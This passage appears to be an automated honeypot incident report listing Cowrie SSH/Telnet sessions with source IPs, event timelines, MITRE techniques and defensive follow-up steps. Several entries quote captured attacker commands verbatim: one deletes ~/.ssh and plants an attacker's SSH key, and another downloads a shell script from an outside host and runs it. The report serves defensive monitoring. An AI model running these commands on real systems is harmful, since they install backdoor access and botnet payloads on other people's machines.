| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:22:54` | `cowrie.session.connect` |
| `2026-09-24 03:22:54` | `cowrie.client.version` |
| `2026-09-24 03:22:54` | `cowrie.client.kex` |
| `2026-09-24 03:22:55` | `cowrie.login.success` |
| `2026-09-24 03:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.125.67[.]31` to AbuseIPDB if not already reported
- [ ] Block `45.125.67[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fc0d43df141

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]204` |
| **First Seen** | 2026-09-24 03:24 |
| **Last Seen** | 2026-09-24 03:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:24:26` | `cowrie.session.connect` |
| `2026-09-24 03:24:26` | `cowrie.telnet.option` |
| `2026-09-24 03:24:26` | `cowrie.telnet.option` |
| `2026-09-24 03:24:57` | `cowrie.login.success` |
| `2026-09-24 03:24:58` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]204` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55808e67a4d1

| Field | Detail |
|---|---|
| **Source IP** | `35.195.96[.]243` |
| **First Seen** | 2026-09-24 03:32 |
| **Last Seen** | 2026-09-24 03:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:32:23` | `cowrie.session.connect` |
| `2026-09-24 03:32:23` | `cowrie.login.success` |
| `2026-09-24 03:32:24` | `cowrie.session.params` |
| `2026-09-24 03:32:24` | `cowrie.command.input` |
| `2026-09-24 03:32:24` | `cowrie.command.input` |
| `2026-09-24 03:32:24` | `cowrie.command.failed` |
| `2026-09-24 03:32:24` | `cowrie.command.input` |
| `2026-09-24 03:32:24` | `cowrie.log.closed` |
| `2026-09-24 03:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.96[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.195.96[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a28ba2de48d8

| Field | Detail |
|---|---|
| **Source IP** | `35.195.96[.]243` |
| **First Seen** | 2026-09-24 03:32 |
| **Last Seen** | 2026-09-24 03:32 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:32:37` | `cowrie.session.connect` |
| `2026-09-24 03:32:37` | `cowrie.login.success` |
| `2026-09-24 03:32:37` | `cowrie.session.params` |
| `2026-09-24 03:32:37` | `cowrie.command.input` |
| `2026-09-24 03:32:37` | `cowrie.command.failed` |
| `2026-09-24 03:32:51` | `cowrie.log.closed` |
| `2026-09-24 03:32:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.96[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.195.96[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2d326c42ebe

| Field | Detail |
|---|---|
| **Source IP** | `35.195.96[.]243` |
| **First Seen** | 2026-09-24 03:32 |
| **Last Seen** | 2026-09-24 03:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:32:38` | `cowrie.session.connect` |
| `2026-09-24 03:32:38` | `cowrie.login.success` |
| `2026-09-24 03:32:39` | `cowrie.session.params` |
| `2026-09-24 03:32:39` | `cowrie.command.input` |
| `2026-09-24 03:32:51` | `cowrie.log.closed` |
| `2026-09-24 03:32:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.195.96[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.195.96[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7951db472b9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-24 03:33 |
| **Last Seen** | 2026-09-24 03:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:33:41` | `cowrie.session.connect` |
| `2026-09-24 03:33:41` | `cowrie.client.version` |
| `2026-09-24 03:33:41` | `cowrie.client.kex` |
| `2026-09-24 03:33:41` | `cowrie.login.success` |
| `2026-09-24 03:33:41` | `cowrie.direct-tcpip.request` |
| `2026-09-24 03:33:41` | `cowrie.direct-tcpip.data` |
| `2026-09-24 03:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-116a86d1711f

| Field | Detail |
|---|---|
| **Source IP** | `20.219.91[.]90` |
| **First Seen** | 2026-09-24 03:47 |
| **Last Seen** | 2026-09-24 03:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:47:12` | `cowrie.session.connect` |
| `2026-09-24 03:47:12` | `cowrie.client.version` |
| `2026-09-24 03:47:12` | `cowrie.client.kex` |
| `2026-09-24 03:47:13` | `cowrie.login.success` |
| `2026-09-24 03:47:14` | `cowrie.session.params` |
| `2026-09-24 03:47:14` | `cowrie.command.input` |
| `2026-09-24 03:47:14` | `cowrie.command.failed` |
| `2026-09-24 03:47:15` | `cowrie.log.closed` |
| `2026-09-24 03:47:15` | `cowrie.session.params` |
| `2026-09-24 03:47:15` | `cowrie.command.input` |
| `2026-09-24 03:47:16` | `cowrie.session.file_download` |
| `2026-09-24 03:47:16` | `cowrie.log.closed` |
| `2026-09-24 03:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.219.91[.]90` to AbuseIPDB if not already reported
- [ ] Block `20.219.91[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dda1592c88e

| Field | Detail |
|---|---|
| **Source IP** | `20.219.91[.]90` |
| **First Seen** | 2026-09-24 03:47 |
| **Last Seen** | 2026-09-24 03:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:47:16` | `cowrie.session.connect` |
| `2026-09-24 03:47:16` | `cowrie.client.version` |
| `2026-09-24 03:47:16` | `cowrie.client.kex` |
| `2026-09-24 03:47:17` | `cowrie.login.success` |
| `2026-09-24 03:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.219.91[.]90` to AbuseIPDB if not already reported
- [ ] Block `20.219.91[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45a1fb5d3a47

| Field | Detail |
|---|---|
| **Source IP** | `20.219.91[.]90` |
| **First Seen** | 2026-09-24 03:47 |
| **Last Seen** | 2026-09-24 03:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:47:17` | `cowrie.session.connect` |
| `2026-09-24 03:47:17` | `cowrie.client.version` |
| `2026-09-24 03:47:17` | `cowrie.client.kex` |
| `2026-09-24 03:47:18` | `cowrie.login.success` |
| `2026-09-24 03:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.219.91[.]90` to AbuseIPDB if not already reported
- [ ] Block `20.219.91[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2007a66da0fc

| Field | Detail |
|---|---|
| **Source IP** | `20.243.208[.]191` |
| **First Seen** | 2026-09-24 03:48 |
| **Last Seen** | 2026-09-24 03:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:48:27` | `cowrie.session.connect` |
| `2026-09-24 03:48:27` | `cowrie.client.version` |
| `2026-09-24 03:48:27` | `cowrie.client.kex` |
| `2026-09-24 03:48:28` | `cowrie.login.success` |
| `2026-09-24 03:48:29` | `cowrie.session.params` |
| `2026-09-24 03:48:29` | `cowrie.command.input` |
| `2026-09-24 03:48:29` | `cowrie.command.failed` |
| `2026-09-24 03:48:29` | `cowrie.log.closed` |
| `2026-09-24 03:48:30` | `cowrie.session.params` |
| `2026-09-24 03:48:30` | `cowrie.command.input` |
| `2026-09-24 03:48:30` | `cowrie.session.file_download` |
| `2026-09-24 03:48:30` | `cowrie.log.closed` |
| `2026-09-24 03:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.243.208[.]191` to AbuseIPDB if not already reported
- [ ] Block `20.243.208[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bc3f627b8b8

| Field | Detail |
|---|---|
| **Source IP** | `20.243.208[.]191` |
| **First Seen** | 2026-09-24 03:48 |
| **Last Seen** | 2026-09-24 03:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:48:30` | `cowrie.session.connect` |
| `2026-09-24 03:48:30` | `cowrie.client.version` |
| `2026-09-24 03:48:30` | `cowrie.client.kex` |
| `2026-09-24 03:48:31` | `cowrie.login.success` |
| `2026-09-24 03:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.243.208[.]191` to AbuseIPDB if not already reported
- [ ] Block `20.243.208[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e73c51fccc6

| Field | Detail |
|---|---|
| **Source IP** | `20.243.208[.]191` |
| **First Seen** | 2026-09-24 03:48 |
| **Last Seen** | 2026-09-24 03:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:48:31` | `cowrie.session.connect` |
| `2026-09-24 03:48:31` | `cowrie.client.version` |
| `2026-09-24 03:48:31` | `cowrie.client.kex` |
| `2026-09-24 03:48:32` | `cowrie.login.success` |
| `2026-09-24 03:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.243.208[.]191` to AbuseIPDB if not already reported
- [ ] Block `20.243.208[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-539aacfc3a3b

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-09-24 03:52 |
| **Last Seen** | 2026-09-24 03:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:52:07` | `cowrie.session.connect` |
| `2026-09-24 03:52:07` | `cowrie.client.version` |
| `2026-09-24 03:52:07` | `cowrie.client.kex` |
| `2026-09-24 03:52:08` | `cowrie.login.success` |
| `2026-09-24 03:52:09` | `cowrie.session.params` |
| `2026-09-24 03:52:09` | `cowrie.command.input` |
| `2026-09-24 03:52:09` | `cowrie.command.failed` |
| `2026-09-24 03:52:10` | `cowrie.log.closed` |
| `2026-09-24 03:52:10` | `cowrie.session.params` |
| `2026-09-24 03:52:10` | `cowrie.command.input` |
| `2026-09-24 03:52:11` | `cowrie.session.file_download` |
| `2026-09-24 03:52:11` | `cowrie.log.closed` |
| `2026-09-24 03:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccde6b44a967

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-09-24 03:52 |
| **Last Seen** | 2026-09-24 03:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:52:11` | `cowrie.session.connect` |
| `2026-09-24 03:52:11` | `cowrie.client.version` |
| `2026-09-24 03:52:11` | `cowrie.client.kex` |
| `2026-09-24 03:52:12` | `cowrie.login.success` |
| `2026-09-24 03:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-526d5d73cc21

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-09-24 03:52 |
| **Last Seen** | 2026-09-24 03:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 03:52:13` | `cowrie.session.connect` |
| `2026-09-24 03:52:13` | `cowrie.client.version` |
| `2026-09-24 03:52:13` | `cowrie.client.kex` |
| `2026-09-24 03:52:14` | `cowrie.login.success` |
| `2026-09-24 03:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d2ff3857bfa

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-09-24 04:07 |
| **Last Seen** | 2026-09-24 04:07 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, linuxshell, system, sh, ls /home; /bin/busybox BOTNET` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 04:07:40` | `cowrie.session.connect` |
| `2026-09-24 04:07:40` | `cowrie.login.success` |
| `2026-09-24 04:07:41` | `cowrie.session.params` |
| `2026-09-24 04:07:41` | `cowrie.command.input` |
| `2026-09-24 04:07:41` | `cowrie.command.failed` |
| `2026-09-24 04:07:41` | `cowrie.command.input` |
| `2026-09-24 04:07:41` | `cowrie.command.failed` |
| `2026-09-24 04:07:41` | `cowrie.command.input` |
| `2026-09-24 04:07:41` | `cowrie.command.failed` |
| `2026-09-24 04:07:41` | `cowrie.command.input` |
| `2026-09-24 04:07:41` | `cowrie.command.input` |
| `2026-09-24 04:07:41` | `cowrie.command.input` |
| `2026-09-24 04:07:42` | `cowrie.session.file_download` |
| `2026-09-24 04:07:42` | `cowrie.session.file_download` |
| `2026-09-24 04:07:42` | `cowrie.session.file_download` |
| `2026-09-24 04:07:42` | `cowrie.session.file_download.failed` |
| `2026-09-24 04:07:57` | `cowrie.log.closed` |
| `2026-09-24 04:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fcde7c7e0bd

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-09-24 04:07 |
| **Last Seen** | 2026-09-24 04:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 04:07:41` | `cowrie.session.connect` |
| `2026-09-24 04:07:42` | `cowrie.login.success` |
| `2026-09-24 04:07:42` | `cowrie.session.params` |
| `2026-09-24 04:07:42` | `cowrie.command.input` |
| `2026-09-24 04:07:42` | `cowrie.session.file_download` |
| `2026-09-24 04:07:43` | `cowrie.session.file_download` |
| `2026-09-24 04:07:43` | `cowrie.session.file_download` |
| `2026-09-24 04:07:43` | `cowrie.session.file_download.failed` |
| `2026-09-24 04:07:45` | `cowrie.log.closed` |
| `2026-09-24 04:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e7c1f635f51

| Field | Detail |
|---|---|
| **Source IP** | `115.190.181[.]231` |
| **First Seen** | 2026-09-24 04:08 |
| **Last Seen** | 2026-09-24 04:13 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 04:08:13` | `cowrie.session.connect` |
| `2026-09-24 04:08:13` | `cowrie.client.version` |
| `2026-09-24 04:08:14` | `cowrie.client.kex` |
| `2026-09-24 04:08:15` | `cowrie.login.success` |
| `2026-09-24 04:13:15` | `cowrie.session.file_upload` |
| `2026-09-24 04:13:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.181[.]231` to AbuseIPDB if not already reported
- [ ] Block `115.190.181[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b45d7484fd4e

| Field | Detail |
|---|---|
| **Source IP** | `34.156.95[.]119` |
| **First Seen** | 2026-09-24 04:14 |
| **Last Seen** | 2026-09-24 04:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 04:14:13` | `cowrie.session.connect` |
| `2026-09-24 04:14:13` | `cowrie.login.success` |
| `2026-09-24 04:14:14` | `cowrie.session.params` |
| `2026-09-24 04:14:14` | `cowrie.command.input` |
| `2026-09-24 04:14:14` | `cowrie.command.input` |
| `2026-09-24 04:14:14` | `cowrie.command.failed` |
| `2026-09-24 04:14:14` | `cowrie.command.input` |
| `2026-09-24 04:14:14` | `cowrie.log.closed` |
| `2026-09-24 04:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.95[.]119` to AbuseIPDB if not already reported
- [ ] Block `34.156.95[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afb30b07139c

| Field | Detail |
|---|---|
| **Source IP** | `34.156.95[.]119` |
| **First Seen** | 2026-09-24 04:14 |
| **Last Seen** | 2026-09-24 04:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 04:14:27` | `cowrie.session.connect` |
| `2026-09-24 04:14:27` | `cowrie.login.success` |
| `2026-09-24 04:14:27` | `cowrie.session.params` |
| `2026-09-24 04:14:27` | `cowrie.command.input` |
| `2026-09-24 04:14:27` | `cowrie.command.failed` |
| `2026-09-24 04:14:29` | `cowrie.log.closed` |
| `2026-09-24 04:14:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.95[.]119` to AbuseIPDB if not already reported
- [ ] Block `34.156.95[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5102931baefe

| Field | Detail |
|---|---|
| **Source IP** | `34.156.95[.]119` |
| **First Seen** | 2026-09-24 04:14 |
| **Last Seen** | 2026-09-24 04:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 04:14:29` | `cowrie.session.connect` |
| `2026-09-24 04:14:29` | `cowrie.login.success` |
| `2026-09-24 04:14:29` | `cowrie.session.params` |
| `2026-09-24 04:14:29` | `cowrie.command.input` |
| `2026-09-24 04:14:29` | `cowrie.log.closed` |
| `2026-09-24 04:14:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.95[.]119` to AbuseIPDB if not already reported
- [ ] Block `34.156.95[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6877fa86a0f2

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-24 04:17 |
| **Last Seen** | 2026-09-24 04:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 04:17:55` | `cowrie.session.connect` |
| `2026-09-24 04:17:55` | `cowrie.client.version` |
| `2026-09-24 04:17:55` | `cowrie.client.kex` |
| `2026-09-24 04:17:55` | `cowrie.login.success` |
| `2026-09-24 04:17:55` | `cowrie.direct-tcpip.request` |
| `2026-09-24 04:17:56` | `cowrie.direct-tcpip.data` |
| `2026-09-24 04:17:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02b0577a71f2

| Field | Detail |
|---|---|
| **Source IP** | `47.251.110[.]209` |
| **First Seen** | 2026-09-24 04:32 |
| **Last Seen** | 2026-09-24 04:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: curl/7.64.1, Accept: */*` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 04:32:55` | `cowrie.session.connect` |
| `2026-09-24 04:32:55` | `cowrie.login.success` |
| `2026-09-24 04:32:56` | `cowrie.session.params` |
| `2026-09-24 04:32:56` | `cowrie.command.input` |
| `2026-09-24 04:32:56` | `cowrie.command.failed` |
| `2026-09-24 04:32:56` | `cowrie.command.input` |
